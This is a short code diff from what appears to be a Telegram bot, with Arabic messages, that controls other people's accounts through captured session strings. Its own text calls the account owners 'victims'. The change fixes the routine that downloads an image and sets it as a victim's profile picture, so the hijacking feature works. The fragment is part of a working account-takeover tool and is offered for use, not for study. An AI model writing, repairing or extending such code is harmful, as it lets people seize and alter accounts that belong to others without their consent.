@@ -810,7 +810,8 @@ async def users(event):
         else:
             return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
         await x.send_message("اعطني الصورة الجديدة")
-        new_pic = await x.get_response()
-        await change_pic(strses.text, new_pic.media.photo)  # استلام الصوره هنا
+        new_pic_msg = await x.get_response()
+        new_pic = await new_pic_msg.download_media()
+        await change_pic(strses.text, new_pic)  # استلام الصوره هنا
         await event.reply(" تم تغيير صورة الحساب بنجاح ", buttons=keyboard)
 
